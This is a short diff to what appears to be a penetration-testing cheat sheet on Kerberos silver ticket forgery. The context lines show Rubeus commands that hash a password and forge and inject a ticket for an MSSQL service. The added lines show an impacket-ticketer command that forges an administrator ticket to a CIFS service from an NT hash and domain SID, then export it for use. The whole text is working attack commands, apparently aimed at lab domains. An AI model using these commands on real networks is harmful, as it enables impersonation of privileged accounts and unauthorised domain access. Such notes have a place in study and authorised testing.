@@ -108,4 +108,13 @@ rubeus.exe hash /password:Password@1
 rubeus.exe silver /service:MSSQLSvc/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /sid:S-1-5-21-2377760704-1974907900-3052042330 /user:harshitrajpal /domain:ignite.local /ptt
 
 
+using ticketer:
+impacket-ticketer -nthash c6ba25c393c4e412825e6c476c7f2e12 \ 
+            -domain-sid S-1-5-21-1730870759-634495401-3117737333 \
+            -domain MARVEL.LOCAL \
+            -spn cifs/HYDRA-DC.marvel.local \
+            administrator
+
+export KRB5CCNAME=Administrator.ccache
+
 ```
